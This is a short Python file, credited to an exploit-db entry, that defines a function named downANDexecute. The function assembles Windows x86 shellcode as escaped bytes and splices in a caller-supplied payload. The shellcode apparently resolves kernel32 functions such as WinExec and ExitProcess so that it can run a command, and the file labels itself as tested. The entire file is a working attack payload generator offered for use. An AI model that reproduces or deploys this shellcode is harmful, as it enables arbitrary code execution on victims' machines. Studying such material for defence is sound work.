#https://www.exploit-db.com/exploits/39389/
#Author: b3mb4m

#WORK Tested.

def downANDexecute( payload ):

    shellcode =  r"\x31\xc9\xb9\x57\x69\x6e\x45\xeb\x04\x31\xc9\xeb\x00\x31\xc0\x31"
    shellcode += r"\xdb\x31\xd2\x31\xff\x31\xf6\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f"
    shellcode += r"\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89"
    shellcode += r"\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd"
    shellcode += r"\x81\xf9\x57\x69\x6e\x45\x0f\x85\x30\x01\x00\x00\x8b\x34\xaf\x01"
    shellcode += r"\xc6\x45\x39\x0e\x75\xf6\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b"
    shellcode += r"\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd"
    shellcode += payload
    shellcode += r"\x89\xe2\x41\x51\x52\xff\xd7\xe8\x8d\xfe\xff\xff\x8b\x34\xaf\x01\xc6"
    shellcode += r"\x45\x81\x3e\x45\x78\x69\x74\x75\xf2\x81\x7e\x04\x50\x72\x6f\x63\x75"
    shellcode += r"\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c"
    shellcode += r"\xaf\xfc\x01\xc7\x31\xc9\x51\xff\xd7"

    return shellcode
